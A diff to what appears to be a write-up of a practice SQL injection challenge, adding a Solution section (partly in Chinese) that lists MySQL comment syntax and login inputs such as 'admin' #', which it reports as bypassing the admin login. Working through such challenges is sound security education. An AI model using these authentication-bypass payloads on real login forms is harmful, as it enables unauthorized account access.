@@ -2,7 +2,7 @@
 This one is the classic mysql injection challenge.
 
 Your mission is easy: Login yourself as admin.
-```
+```php
 <?php
 /* TABLE STRUCTURE
 CREATE TABLE IF NOT EXISTS users (
@@ -79,3 +79,22 @@ function auth1_onLogin(WC_Challenge $chall, $username, $password)
 </table>
 </form>
 ```
+
+## Solution
+
+MySql中的注释包括
+ - #
+ - /**/
+
+```
+username=admin' /* 
+password='' 
+失败
+username=admin' --
+password=
+失败
+username=admin' #
+password=
+成功
+```
+
